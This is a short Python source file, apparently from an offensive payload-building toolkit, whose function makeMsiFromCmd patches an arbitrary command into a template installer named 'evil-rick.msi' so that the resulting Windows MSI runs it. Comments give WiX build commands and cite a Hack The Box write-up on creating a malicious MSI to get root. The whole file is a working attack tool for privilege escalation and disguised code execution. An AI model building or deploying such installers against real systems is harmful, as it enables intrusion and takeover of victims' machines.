import argparse
import io
import os, sys
import logging

from model import *
from helpers import *


# install wix from https://github.com/wixtoolset/wix3
# candle.exe evil-rick.xml
# light.exe -out evil-rick.msi evil-rick.wixobj


@DataTracker
def makeMsiFromCmd(cmd: AceStr) -> AceBytes:
    """Return a MSI which executes cmd"""
    template = 'make/msi/evil-rick.msi' # https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root
    placeholderLen = 512
    if len(cmd) > placeholderLen:
        raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))

    placeholder = b"A" * placeholderLen
    exchange = cmd + (" " * (placeholderLen - len(cmd)))
    exchangeBytes = bytes(exchange, 'ascii')

    file = open(template, 'rb')
    data = file.read()
    file.close()

    data = replacer(data, placeholder, exchangeBytes)
    return AceBytes(data)
